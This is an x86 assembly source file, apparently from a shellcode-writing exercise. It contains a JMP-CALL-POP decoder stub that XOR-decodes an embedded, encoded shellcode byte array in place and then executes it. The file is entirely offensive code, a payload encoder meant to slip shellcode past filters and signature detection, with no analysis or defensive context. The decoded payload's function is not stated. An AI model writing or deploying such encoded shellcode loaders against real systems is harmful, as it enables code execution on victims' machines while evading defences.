global _start

section .text
_start:
    jmp short call_decoder

    decode:
        pop esi                  ;now stores our shellcode
        mov edi, esi             ;save pointer to shellcode to edi
        xor ecx, ecx             ;zero out ecx
        mov edx, ecx             ;zero out edx
        mov cl, len              ;mov length of the shellcode in cl

    decoder_loop:
        mov al, [esi]            ;move first byte of shellcode in eax
        mov bl, [esi + 1]        ;move second byte of shellcode in ebx
        xor al, bl               ;xor first and second byte of the shellcode
        mov [edi], al            ;replace first byte of edi with the result
        inc esi                  ;increment esi
        inc edi                  ;increment edi
        loop decoder_loop        ;loop until cl will equal to zero
        mov byte[esi-1], 0x90    ;replace last symbol with NOP
        jmp shellcode

    call_decoder:
        call decode
        shellcode: db 0x2c,0x46,0x20,0x78,0x49,0x9b,0xaa,0x71,0x32,0x60,0x33,0x59,0x5b,0xd2,0x33,0xfe,0x7e,0xec,0x86,0xe0,0xb8,0xd0,0x8b,0x05,0x5b,0x1d,0x7b,0x13,0x02,0x5e,0x1d,0x7b,0x28,0xa1,0x40,0x2a,0x3a,0x6b,0x39,0xb0,0x51,0x12,0xdf,0x5f,0xd8,0x02,0xb2,0x8d,0xbc,0x75,0xb8,0x38,0x88,0xb7,0xf6,0x3b,0xbb,0x0b,0x34,0x75,0xb8,0x38,0x88,0x83,0xb2,0x60,0x51,0x98,0xca,0xa2,0x8d,0xa2,0xd1,0xb9,0xd1,0xfe,0x9c,0xf5,0x9b,0x12,0xf1,0xa3,0x2a,0xc8,0x9b,0x12,0xf3,0x3e,0xbe
        len equ $-shellcode
